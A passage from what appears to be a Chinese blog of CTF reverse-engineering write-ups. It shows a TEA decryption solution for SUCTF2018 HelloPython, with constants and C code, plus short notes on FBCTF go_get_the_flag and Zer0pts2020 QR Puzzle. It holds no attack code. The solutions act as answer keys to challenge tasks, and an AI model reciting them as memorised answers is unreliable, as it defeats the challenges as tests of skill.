&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;t&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;est}&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 必选&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s4=e&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t=e3&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;中间根据前后单词拼接一下就行了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Shit这道题还是要看一下别人的WP，学习一下正确的思路&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;suctf2018hellopython&#34;&gt;[SUCTF2018]HelloPython&lt;/h2&gt;
&lt;p&gt;uncompyle6&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; __target: [ (&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; __target: [ [ __this() &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; __g[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;n&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [__operator&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;isub(__g[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;n&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)] ][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; __target&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [__operator&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iadd(__target&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value, (y&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; y&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (y&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])] ][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])(z) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; __target&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [__operator&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iadd(__target&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value, (z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])] ][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])(y)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很明显是tea&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k) {  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], v1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sum&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, i;           &lt;span style=&#34;color:#75715e&#34;&gt;/* set up */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; delta&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9e3779b9&lt;/span&gt;;                     &lt;span style=&#34;color:#75715e&#34;&gt;/* a key schedule constant */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; k0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], k1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], k2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], k3&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];   &lt;span style=&#34;color:#75715e&#34;&gt;/* cache key */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {                       &lt;span style=&#34;color:#75715e&#34;&gt;/* basic cycle start */&lt;/span&gt;  
        sum &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; delta;  
        v0 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k0) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k1);  
        v1 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k2) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k3);  
    }                                              &lt;span style=&#34;color:#75715e&#34;&gt;/* end cycle */&lt;/span&gt;  
    v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v0; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v1;  
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对比一下，z是v[1]，x是sum，y是v[0]，或者看下面这段&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; __g[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [c_uint32(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)] ][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; __g[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [c_uint32(v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])] ][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; __g[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;y&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [c_uint32(v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;delta常数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; __g[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;u&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2654435769&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;密钥常数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; __g[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;k&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;3735928559&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;590558003&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19088743&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4275878552&lt;/span&gt;]]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;到题目描述里找到密文 &lt;code&gt;f1f5d29b6e4414ec&lt;/code&gt;（这还得自己去github找，离谱）&lt;/p&gt;
&lt;p&gt;解密&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdint.h&amp;gt;  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  
&lt;span style=&#34;color:#75715e&#34;&gt;//加密函数  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k) {  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], v1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sum&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, i;           &lt;span style=&#34;color:#75715e&#34;&gt;/* set up */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; delta&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9e3779b9&lt;/span&gt;;                     &lt;span style=&#34;color:#75715e&#34;&gt;/* a key schedule constant */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; k0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], k1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], k2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], k3&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];   &lt;span style=&#34;color:#75715e&#34;&gt;/* cache key */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {                       &lt;span style=&#34;color:#75715e&#34;&gt;/* basic cycle start */&lt;/span&gt;  
        sum &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; delta;  
        v0 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k0) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k1);  
        v1 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k2) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k3);  
    }                                              &lt;span style=&#34;color:#75715e&#34;&gt;/* end cycle */&lt;/span&gt;  
    v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v0; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v1;  
}  
&lt;span style=&#34;color:#75715e&#34;&gt;//解密函数  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k) {  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], v1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sum&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xC6EF3720&lt;/span&gt;, i;  &lt;span style=&#34;color:#75715e&#34;&gt;/* set up */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; delta&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9e3779b9&lt;/span&gt;;                     &lt;span style=&#34;color:#75715e&#34;&gt;/* a key schedule constant */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; k0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], k1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], k2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], k3&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];   &lt;span style=&#34;color:#75715e&#34;&gt;/* cache key */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {                         &lt;span style=&#34;color:#75715e&#34;&gt;/* basic cycle start */&lt;/span&gt;  
        v1 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k2) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k3);  
        v0 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k0) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k1);  
        sum &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; delta;  
    }                                              &lt;span style=&#34;color:#75715e&#34;&gt;/* end cycle */&lt;/span&gt;  
    v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v0; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v1;  
}  
  
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()  
{  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;0xf1f5d29b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6e4414ec&lt;/span&gt;},k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;3735928559&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;590558003&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19088743&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4275878552&lt;/span&gt;};  
    &lt;span style=&#34;color:#75715e&#34;&gt;// v为要加密的数据是两个32位无符号整数  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// printf(&amp;#34;加密前原始数据：%u %u\n&amp;#34;,v[0],v[1]);  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// encrypt(v, k);  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// printf(&amp;#34;加密后的数据：%u %u\n&amp;#34;,v[0],v[1]);  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    decrypt(v, k);  
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;解密后的数据：%x %x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;  
}  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;fbctfgo_get_the_flag&#34;&gt;[FBCTF]go_get_the_flag&lt;/h2&gt;
&lt;p&gt;没想到能在第五页见到memequal的题，真正的baby&lt;/p&gt;
&lt;h2 id=&#34;zer0pts2020qr-puzzle&#34;&gt;[Zer0pts2020]QR Puzzle&lt;/h2&gt;
&lt;p&gt;QR文件是25*25的字符串，每一位都是字符0或1&lt;/p&gt;
&lt;p&gt;key文件每一行格式为 &lt;code&gt;a#(b,c)&lt;/code&gt;，最后存储到链表中，末尾在前，具体结构为 &lt;code&gt;int b, int c, int a, 0, *next&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;从加密函数来看，应该是一个vm&lt;/p&gt;
&lt;p&gt;简单整理一下&lt;/p&gt;
